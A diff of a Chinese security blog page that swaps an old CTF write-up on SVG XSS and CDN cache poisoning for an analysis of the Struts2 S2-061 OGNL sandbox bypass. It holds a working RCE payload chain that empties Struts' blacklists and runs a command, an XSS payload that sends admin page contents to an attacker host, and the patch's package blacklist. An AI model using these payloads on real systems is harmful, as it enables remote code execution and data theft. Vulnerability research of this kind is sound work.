@@ -16,7 +16,7 @@
   <meta name="description" content="摸鱼">
   <meta name="author" content="Aluvion">
   <meta name="keywords" content="">
-  <title>SVG XSS-CDN-Web缓存投毒 - Twings</title>
+  <title>struts2系列漏洞 S2-061 - Twings</title>
 
   <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
 <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
@@ -117,7 +117,7 @@
               
                 <p class="mt-3 post-meta">
                   <i class="fas fa-calendar-alt" aria-hidden="true"></i>
-                  星期四, 四月 4日 2019, 10:15 晚上
+                  星期日, 四月 17日 2022, 12:50 凌晨
                 </p>
               
 
@@ -126,7 +126,7 @@
                   
                   <span class="post-meta">
                     <i class="far fa-chart-bar"></i>
-                    958 字
+                    1.2k 字
                   </span>
                 
 
@@ -134,7 +134,7 @@
                   
                   <span class="post-meta">
                       <i class="far fa-clock"></i>
-                      4 分钟
+                      5 分钟
                   </span>
                 
 
@@ -169,70 +169,227 @@
           <div class="post-content mx-auto" id="post">
             
             <div class="markdown-body">
-              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>好长一段时间之前看到的一篇文章和一道题，结果我一直干别的事情，都没有好好研究一下，现在赶紧补一下坑，写篇文章总结记录一哈。</p>
-<p>题目的预期解是SVG XSS，而非预期解是缓存投毒。</p>
+              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p> 经典 Java 软件漏洞 struts 系列，准备一个个看过去。</p>
 <a id="more"></a>
 <hr>
-<h3 id="SVG-XSS"><a href="#SVG-XSS" class="headerlink" title="SVG XSS"></a>SVG XSS</h3><p>题目链接：<a href="http://web50.zajebistyc.tf/" target="_blank" rel="noopener">http://web50.zajebistyc.tf/</a></p>
-<p>writeup：<a href="https://xz.aliyun.com/t/4492#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/4492#toc-2</a></p>
-<p>SVG XSS：<a href="https://www.hackersb.cn/hacker/85.html" target="_blank" rel="noopener">https://www.hackersb.cn/hacker/85.html</a></p>
-<p>payload：</p>
-<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;
-&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;
-&lt;svg version=&quot;1.1&quot; id=&quot;Layer_1&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; x=&quot;0px&quot; y=&quot;0px&quot; width=&quot;100px&quot; height=&quot;100px&quot; viewBox=&quot;0 0 751 751&quot; enable-background=&quot;new 0 0 751 751&quot; xml:space=&quot;preserve&quot;&gt;  &lt;image id=&quot;image0&quot; width=&quot;751&quot; height=&quot;751&quot; x=&quot;0&quot; y=&quot;0&quot;
-    href=&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo&quot; /&gt;
-&lt;script&gt;
-    var xmlhttp = new XMLHttpRequest();
-    var response;
-    xmlhttp.onreadystatechange = function() {
-        if (4 == xmlhttp.readyState) {
-            if (200 == xmlhttp.status) {
-                location.href=&#39;https://*.*.*.*/xss.php?&#39;+btoa(xmlhttp.responseText);
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>影响版本Struts 2.0.0 - Struts 2.5.25，这里使用struts 2.5.25。</p>
+<p><a href="https://cwiki.apache.org/confluence/display/WW/S2-061" target="_blank" rel="noopener">官方通告</a>，主要看沙盒绕过方式，需要引入一个老朋友依赖：</p>
+<pre><code class="xml">&lt;dependency&gt;
+    &lt;groupId&gt;commons-collections&lt;/groupId&gt;
+    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
+    &lt;version&gt;3.2.2&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>现有的沙盒限制主要位于SecurityMemberAccess类中，类型如下：</p>
+<ul>
+<li><p>无法new一个对象，由isClassExcluded函数负责，前面的callConstructor函数将target设置为一个class，isAccessible函数中获得的targetClass就为Class.class，触发isClassExcluded函数中的：</p>
+<pre><code class="java">clazz == Class.class &amp;&amp; !allowStaticMethodAccess
+</code></pre>
+</li>
+<li><p>无法调用黑名单类和包的方法、属性，由isPackageExcluded等函数负责</p>
+</li>
+<li><p>无法使用反射，由isClassExcluded函数负责，由于将java.lang.Object和java.lang.Class放入黑名单，而反射需要调用它们的getClass、getDeclaredMethod等函数</p>
+</li>
+<li><p>无法调用静态方法，由Modifier.isStatic和allowStaticMethodAccess属性负责</p>
+</li>
+</ul>
+<p>还在OgnlRuntime的invokeMethod函数中以写死的方式禁止了一些类，即绕过沙盒也无法使用它们。</p>
+<p>我们现在还剩下的手段，就只有调用已实例化对象的非静态函数了。</p>
+<p>#application中存在一个DefaultInstanceManager对象：</p>
+<p><img src="/css/images/S2-061/2022041601.png" srcset="/img/loading.gif" alt=""></p>
+<p>其newInstance函数如下：</p>
+<pre><code class="java">public Object newInstance(String className) throws IllegalAccessException, InvocationTargetException, NamingException, InstantiationException, ClassNotFoundException, IllegalArgumentException, NoSuchMethodException, SecurityException {
+    Class&lt;?&gt; clazz = this.loadClassMaybePrivileged(className, this.classLoader);
+    return this.newInstance(clazz.getConstructor().newInstance(), clazz);
+}
+
+private Object newInstance(Object instance, Class&lt;?&gt; clazz) throws IllegalAccessException, InvocationTargetException, NamingException {
+    if (!this.ignoreAnnotations) {
+        Map&lt;String, String&gt; injections = this.assembleInjectionsFromClassHierarchy(clazz);
+        this.populateAnnotationsCache(clazz, injections);
+        this.processAnnotations(instance, injections);
+        this.postConstruct(instance, clazz);
+    }
+
+    return instance;
+}
+</code></pre>
+<p>可以通过一个字符串创建一个新的对象，但是要求该类存在public的无参构造函数。</p>
+<p>老朋友依赖中的org.apache.commons.collections.BeanMap类存在public的无参构造函数：</p>
+<pre><code class="java">public BeanMap() {
+}
+</code></pre>
+<p>其setBean函数如下：</p>
+<pre><code class="java">public void setBean(Object newBean) {
+    this.bean = newBean;
+    this.reinitialise();
+}
+</code></pre>
+<p>reinitialise函数：</p>
+<pre><code class="java">protected void reinitialise() {
+    readMethods.clear();
+    writeMethods.clear();
+    types.clear();
+    initialise();
+}
+
+private void initialise() {
+    if(getBean() == null) return;
+
+    Class  beanClass = getBean().getClass();
+    try {
+        //BeanInfo beanInfo = Introspector.getBeanInfo( bean, null );
+        BeanInfo beanInfo = Introspector.getBeanInfo( beanClass );
+        PropertyDescriptor[] propertyDescriptors = beanInfo.getPropertyDescriptors();
+        if ( propertyDescriptors != null ) {
+            for ( int i = 0; i &lt; propertyDescriptors.length; i++ ) {
+                PropertyDescriptor propertyDescriptor = propertyDescriptors[i];
+                if ( propertyDescriptor != null ) {
+                    String name = propertyDescriptor.getName();
+                    Method readMethod = propertyDescriptor.getReadMethod();
+                    Method writeMethod = propertyDescriptor.getWriteMethod();
+                    Class aType = propertyDescriptor.getPropertyType();
+
+                    if ( readMethod != null ) {
+                        readMethods.put( name, readMethod );
+                    }
+                    if ( writeMethod != null ) {
+                        writeMethods.put( name, writeMethod );
+                    }
+                    types.put( name, aType );
+                }
             }
         }
-    };
-    xmlhttp.open(&quot;GET&quot;, &quot;/profile/admin&quot;);
-    xmlhttp.send();
-&lt;/script&gt;
-&lt;/svg&gt;
-</code></pre><p>正解就随便一题带过。</p>
+    }
+    ...
+}
+</code></pre>
+<p>简单来说就是会获取输入的对象中的所有属性的描述符及相应的getter和setter放入对应的清空后的HashMap中。</p>
+<p>然后其get函数：</p>
+<pre><code class="java">public Object get(Object name) {
+    if ( bean != null ) {
+        Method method = getReadMethod( name );
+        if ( method != null ) {
+            try {
+                return method.invoke( bean, NULL_ARGUMENTS );
+            }
+            catch (  IllegalAccessException e ) {
+                logWarn( e );
+            }
+            catch ( IllegalArgumentException e ) {
+                logWarn(  e );
+            }
+            catch ( InvocationTargetException e ) {
+                logWarn(  e );
+            }
+            catch ( NullPointerException e ) {
+                logWarn(  e );
+            }
+        }
+    }
+    return null;
+}
+</code></pre>
+<p>可以调用输入name的getter函数，因为OgnlValueStack中存在getContext函数，所以可以通过BeanMap获取其中存放的context：</p>
+<pre><code class="python">data1 = {
+    &quot;username&quot;: &quot;%{&quot;
+                &quot;(#stack=#attr[&#39;struts.valueStack&#39;]).&quot;
+                &quot;(#beanmap=#application[&#39;org.apache.tomcat.InstanceManager&#39;].newInstance(\&quot;org.apache.commons.collections.BeanMap\&quot;)).&quot;
+                &quot;(#beanmap.setBean(#stack)).&quot;
+                &quot;(#context=#beanmap.get(\&quot;context\&quot;))&quot;
+                &quot;}&quot;
+}
+</code></pre>
+<p>通过调试可以看到结果：</p>
+<p><img src="/css/images/S2-061/2022041602.png" srcset="/img/loading.gif" alt=""></p>
+<p>获取到context后就可以通过其getMemberAccess函数获取SecurityMemberAccess，然后就是调用其setter清空其中的黑名单，这里可以使用BeanMap的put函数：</p>
+<pre><code class="java">public Object put(Object name, Object value) throws IllegalArgumentException, ClassCastException {
+    if ( bean != null ) {
+        Object oldValue = get( name );
+        Method method = getWriteMethod( name );
+        if ( method == null ) {
+            ...
+        try {
+            Object[] arguments = createWriteMethodArguments( method, value );
+            method.invoke( bean, arguments );
+
+            Object newValue = get( name );
+            firePropertyChange( name, oldValue, newValue );
+        }
+        catch ( InvocationTargetException e ) {
+            logInfo( e );
+            throw new IllegalArgumentException( e.getMessage() );
+        }
+        catch ( IllegalAccessException e ) {
+            logInfo( e );
+            throw new IllegalArgumentException( e.getMessage() );
+        }
+        return oldValue;
+    }
+    return null;
+}
+</code></pre>
+<p>虽然源码中的freemarker.template.utility.Execute类没有无参构造函数，但我们都知道JVM会给它自己加一个，所以最后payload：</p>
+<pre><code class="java">data1 = {
+    &quot;username&quot;: &quot;%{&quot;
+        &quot;(#stack=#attr[&#39;struts.valueStack&#39;]).&quot;
+        &quot;(#instanceManager=#application[&#39;org.apache.tomcat.InstanceManager&#39;]).&quot;
+        &quot;(#beanmap=#instanceManager.newInstance(\&quot;org.apache.commons.collections.BeanMap\&quot;)).&quot;
+        &quot;(#emptySet=#instanceManager.newInstance(\&quot;java.util.HashSet\&quot;)).&quot;
+        &quot;(#beanmap.setBean(#stack)).&quot;
+        &quot;(#context=#beanmap.get(\&quot;context\&quot;)).&quot;
+        &quot;(#beanmap.setBean(#context)).&quot;
+        &quot;(#memberAccess=#beanmap.get(\&quot;memberAccess\&quot;)).&quot;
+        &quot;(#beanmap.setBean(#memberAccess)).&quot;
+        &quot;(#beanmap.put(\&quot;excludedClasses\&quot;, #emptySet)).&quot;
+        &quot;(#beanmap.put(\&quot;excludedPackageNames\&quot;, #emptySet)).&quot;
+        &quot;(#args=#instanceManager.newInstance(\&quot;java.util.ArrayList\&quot;)).&quot;
+        &quot;(#args.add(\&quot;calc.exe\&quot;)).&quot;
+        &quot;(#execute=#instanceManager.newInstance(\&quot;freemarker.template.utility.Execute\&quot;)).&quot;
+        &quot;(#execute.exec(#args))&quot;
+        &quot;}&quot;
+}
+</code></pre>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>同S2-059。</p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>在Struts 2.5.26版本下，黑名单增加了：</p>
+<pre><code class="xml">&lt;constant name=&quot;struts.excludedPackageNames&quot;
+          value=&quot;
+                 ognl.,
+                 java.io.,
+                 java.net.,
+                 java.nio.,
+                 javax.,
+                 freemarker.core.,
+                 freemarker.template.,
+                 freemarker.ext.jsp.,
+                 freemarker.ext.rhino.,
+                 sun.misc.,
+                 sun.reflect.,
+                 javassist.,
+                 org.apache.velocity.,
+                 org.objectweb.asm.,
+                 org.springframework.context.,
+                 com.opensymphony.xwork2.inject.,
+                 com.opensymphony.xwork2.ognl.,
+                 com.opensymphony.xwork2.security.,
+                 com.opensymphony.xwork2.util.,
+                 org.apache.tomcat.,
+                 org.apache.catalina.core.,
+                 com.ibm.websphere.,
+                 org.apache.geronimo.,
+                 org.apache.openejb.,
+                 org.apache.tomee.,
+                 org.eclipse.jetty.,
+                 org.mortbay.jetty.,
+                 org.glassfish.,
+                 org.jboss.as.,
+                 org.wildfly.,
+                 weblogic.,&quot; /&gt;
+</code></pre>
+<p>禁止了org.apache.catalina.core.，即禁止了DefaultInstanceManager，无法再通过这个类实例化对象了。</p>
+<p>同时populateComponentHtmlId函数中的id也变成了未经过表达式解析的%{username}，双重评估也修了。</p>
 <hr>
-<h3 id="缓存投毒"><a href="#缓存投毒" class="headerlink" title="缓存投毒"></a>缓存投毒</h3><p>writeup：<a href="https://ctftime.org/writeup/13925" target="_blank" rel="noopener">https://ctftime.org/writeup/13925</a></p>
-<p>Web缓存投毒：<a href="https://www.anquanke.com/post/id/156356" target="_blank" rel="noopener">https://www.anquanke.com/post/id/156356</a></p>
-<p>原理就是利用CDN缓存，攻击者在CDN上缓存一个恶意的静态资源，如果受害人HIT了这个资源，就会受到攻击。</p>
-<p>在这道题目里面，按照题目的配置Vary: Accept-Encoding, Cookie，按理来说由于请求头中Cookie的不同，admin应该是无法命中缓存的才对，但是尝试过后我们会发现，Cookie似乎没有起到作用？</p>
-<p>尝试更多之后我发现，手机上的微信浏览器却不会命中缓存。</p>
-<p>我对微信浏览器进行抓包的时候，它又命中了缓存：</p>
-<p><img src="/css/images/CDN/2019040401.png" srcset="/img/loading.gif" alt=""></p>
-<p>似乎它的CDN跟别的不一样。</p>
-<p>后来我进行了Google，看到了这些文章：</p>
-<p><a href="https://blog.stackpath.com/accept-encoding-vary-important" target="_blank" rel="noopener">https://blog.stackpath.com/accept-encoding-vary-important</a></p>
-<p><a href="https://cdnsun.com/knowledgebase/cdn-static/setting-a-set-cookie-ignore-or-accept" target="_blank" rel="noopener">https://cdnsun.com/knowledgebase/cdn-static/setting-a-set-cookie-ignore-or-accept</a></p>
-<p><a href="https://www.maxcdn.com/one/tutorial/use-cdn-with-cookie-set-sent-from-origin/" target="_blank" rel="noopener">https://www.maxcdn.com/one/tutorial/use-cdn-with-cookie-set-sent-from-origin/</a></p>
-<p><a href="https://www.maxcdn.com/one/tutorial/how-to-use-cdn-with-cloudflare/" target="_blank" rel="noopener">https://www.maxcdn.com/one/tutorial/how-to-use-cdn-with-cloudflare/</a></p>
-<p>可以看到，cloudflare是不会缓存带有set-cookie头的资源的，而当我们在服务器上进行尝试的时候，可以发现CDN缓存了我们的请求：</p>
-<p><img src="/css/images/CDN/2019040402.png" srcset="/img/loading.gif" alt=""></p>
-<p><img src="/css/images/CDN/2019040403.png" srcset="/img/loading.gif" alt=""></p>
-<p>这看起来像是出题人自己开启了Strip All Cookies选项，所以Cookie就没有作用了。</p>
-<p>那微信浏览器又是什么情况呢？难道是Accept-Encoding的原因？但是抓到的包看起来跟chrome没有什么差别耶。</p>
-<hr>
-<h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><p>既然这样，那我就自己整一个CDN来玩玩吧，我使用的是腾讯云的CDN服务，参考的文章：<a href="https://www.boyhost.cn/otherfree/apply-qcloud-free-cdn-deploy.html" target="_blank" rel="noopener">https://www.boyhost.cn/otherfree/apply-qcloud-free-cdn-deploy.html</a> 。</p>
-<p>首先在腾讯云开通CDN服务，按流量计费还是比较便宜的，况且还会赠送几个月50G的流量包：</p>
-<p><img src="/css/images/CDN/2019040501.png" srcset="/img/loading.gif" alt=""></p>
-<p>然后根据他的提示配置好，我这里为了方便测试所以缓存了.php后缀XD，这么干肯定是不对的：</p>
-<p><img src="/css/images/CDN/2019040502.png" srcset="/img/loading.gif" alt=""></p>
-<p><img src="/css/images/CDN/2019040503.png" srcset="/img/loading.gif" alt=""></p>
-<p><img src="/css/images/CDN/2019040504.png" srcset="/img/loading.gif" alt=""></p>
-<p>因为我的源站是HTTPS的缘故，所以我还要申请多一个证书给这个域名和配置DNS解析：</p>
-<p><img src="/css/images/CDN/2019040505.png" srcset="/img/loading.gif" alt=""></p>
-<p><img src="/css/images/CDN/2019040506.png" srcset="/img/loading.gif" alt=""></p>
-<p><img src="/css/images/CDN/2019040507.png" srcset="/img/loading.gif" alt=""></p>
-<p>然后我们就可以开启愉快的CDN之旅了~</p>
-<p>写个输出HTTP头信息的PHP来进行测试，最后通过不停的强制刷新我发现，会有多个不同的IP去访问我的VPS，如果在缓存的时间内两个请求被调度到同一个节点，就会命中相同的缓存，就像腾讯云官方所说：</p>
-<p><img src="/css/images/CDN/2019040508.png" srcset="/img/loading.gif" alt=""></p>
-<p>具体的调度算法我也摸不清楚，大概cloudflare也是类似的构造，所以导致了微信浏览器的特殊情况吧？</p>
-<hr>
-<p>Orz</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://mp.weixin.qq.com/s/RD2HTMn-jFxDIs4-X95u6g" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/RD2HTMn-jFxDIs4-X95u6g</a></p>
 
             </div>
             <hr>
@@ -243,11 +400,11 @@
                   <span>
                 <i class="iconfont icon-tag"></i>
                     
-                      <a class="hover-with-bg" href="/tags/CTF/">CTF</a>
-                    
                       <a class="hover-with-bg" href="/tags/Web/">Web</a>
                     
-                      <a class="hover-with-bg" href="/tags/前端/">前端</a>
+                      <a class="hover-with-bg" href="/tags/Java/">Java</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Struts2/">Struts2</a>
                     
                   </span>
                 
@@ -259,16 +416,11 @@
                 <div class="post-prevnext row">
                   <div class="post-prev col-12 col-md-6">
                     
-                      <a href="/2019/04/07/西湖论剑Web/">
-                        <i class="fa fa-chevron-left"></i>
-                        <span>西湖论剑Web</span>
-                      </a>
-                    
                   </div>
                   <div class="post-next col-12 col-md-6">
                     
-                      <a href="/2019/04/04/Go-1/">
-                        <span>Go(1)</span>
+                      <a href="/2022/04/16/struts2系列漏洞-S2-059/">
+                        <span>struts2系列漏洞 S2-059</span>
                         <i class="fa fa-chevron-right"></i>
                       </a>
                     
@@ -441,7 +593,7 @@
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "SVG XSS-CDN-Web缓存投毒&nbsp;",
+        "struts2系列漏洞 S2-061&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
